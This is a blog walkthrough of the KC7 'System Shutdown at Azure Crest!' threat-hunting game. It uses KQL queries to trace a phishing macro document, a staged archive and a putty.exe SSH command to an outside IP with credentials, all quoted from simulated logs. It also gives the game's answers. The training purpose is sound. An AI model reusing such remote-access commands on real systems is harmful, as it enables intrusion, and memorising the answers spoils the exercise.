## System Shutdown at Azure Crest!

This will be a writeup blog post about my solutions to the KC7 "System Shutdown at Azure Crest!" Investigative Cyber Security game. I will be updating this blog post with my solutions as I complete more of the challenge instead of making separate blog posts for each day. 

## Question 1
The question prompts us with an email from our boss telling us that there was a security alert in the system about a file that is "health" related. The email from our boss finds us to find this file and assess it's threat level and fill out a "super-secret-agent report" template and send it to him. For this question it is asking us to find the name of this suspicious file. In the Azure Data Explorer we can use this KQL query to find two security alerts.
```KQL
SecurityAlerts
| where description contains "health"
```

We find two alerts one with a `high` severity, and one with a `med` severity. The `high` severity alert is the one that we are looking for as it contains the following description: `A suspicious file was quarantined on host ZQHM-LAPTOP: New_Healthcare_Protocols.docm`. Entering the `New_Healthcare_Protocols.docm` we gain the 300pts for Question 1.

## Question 2
This next question is asking about a secondary file name for the same malicious "health" file. Using the following query we can investigate the same machine that the alert originated with:
```KQL
SecurityAlerts
| where description contains "ZQHM-LAPTOP"
```

Here we find two results, one is the original security alert for the first file, the second is a new alert for a secondary file: `Pediatric_Care_Update.docm`. Entering this into the KQL website we gain another 300pts for Question 2.

## Question 3
In the query for Question 2 we discover our second file name, now in order to track how many employees clicked on this email we can run the following query:
```KQL
FileCreationEvents
| where filename == "New_Healthcare_Protocols.docm" or filename == "Pediatric_Care_Update.docm"
| distinct username
```
This query will return to us our results with `37` unique `username`'s. This is our answer for Question 3 and will reward us with another 300pts. 

## Question 4
Taking one of those unique usernames and looking at `process_commandline` for that `username` will reveal to us the commands that were ran on the machine.
```KQL
ProcessEvents
| where username == "jomarkland"
```

Sorting by timestamp we see the event after the initial download of `New_Healthcare_Protocols.docm` was this command: `C:\ProgramData\Heartburn\heartburn.zip`. This file directory is very suspicious as there is a .zip file being stored in some ProgramData directory called `Heartburn`. Submitting the directory `C:\ProgramData\Heartburn\` to KC7 will reward us with another 300pts.

## Question 5
Using the query we crafted in Question 4:
```KQL
ProcessEvents
| where username == "jomarkland"
```
Looking further into the `ProcessEvents` for user `jomarkland` in Question 4 we see another command being ran later:
`cmd.exe /c C:\ProgramData\Heartburn\putty.exe -ssh 93.142.203.80 -l have_ya_tried -pw turning_it_off_and_on_again`. Submitting the answer `SSH` to the KC7 website will give us another 300pts.

## Question 6
Question 6's answer is a reference to Question 4 where we discovered the directory `C:\ProgramData\Heartburn\`. The command that utilized this directory was the following: `cmd.exe /c Expand-Archive -Path C: \ProgramData\heartburn.zip -DestinationPath C:\ProgramData\Heartburn`. Using this as our answer rewards us with 300pts. 

## Question 7
This is a reference to Question 5 where we discovered a putty.exe command for ssh to an ip address. This ip address when thrown into a ip to geo locator will return a location in Croatia. The answer for question 7 is: `93.142.203.80`. Using this as our answer gives us 300pts.

## Question 8
Using the IP we used in Question 7 we can search the `InboundNetworkEvents` filtering by `src_ip` for `93.142.203.80`. Using the following query: 
```KQL
InboundNetworkEvents
| where src_ip == "93.142.203.80"
```

We find 4 records of inbound network traffic from the ip address `93.142.203.80`. The `user_agent` columns for each record is `Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00`, in which we find our answer for Question 8 which is `12.00`. 